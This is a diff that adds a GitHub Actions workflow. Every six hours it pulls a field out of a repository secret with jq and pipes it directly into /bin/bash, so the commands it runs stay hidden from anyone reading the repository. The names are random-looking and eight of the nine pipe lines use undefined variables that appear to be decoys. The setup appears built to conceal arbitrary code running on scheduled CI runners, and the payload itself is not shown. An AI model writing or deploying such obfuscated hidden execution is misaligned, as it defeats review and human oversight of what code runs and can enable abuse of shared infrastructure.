@@ -1,0 +1,25 @@
+name: laoshirenk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laoshirenk
+        env:
+          sqau246: ${{ secrets.sqau246 }}
+        run: |
+          echo $sqau246 | jq -r .kub72657 | /bin/bash
+          echo $grzh7987 | jq -r .rf47 | /bin/bash
+          echo $grr6 | jq -r .pmcv4441 | /bin/bash
+          echo $n595 | jq -r .crbsf83 | /bin/bash
+          echo $o31 | jq -r .k11457 | /bin/bash
+          echo $sxr376 | jq -r .ihrul08008 | /bin/bash
+          echo $yudac187 | jq -r .z363 | /bin/bash
+          echo $jnpyz953 | jq -r .v1477 | /bin/bash
+          echo $utwhi24471 | jq -r .qpc4731 | /bin/bash
+
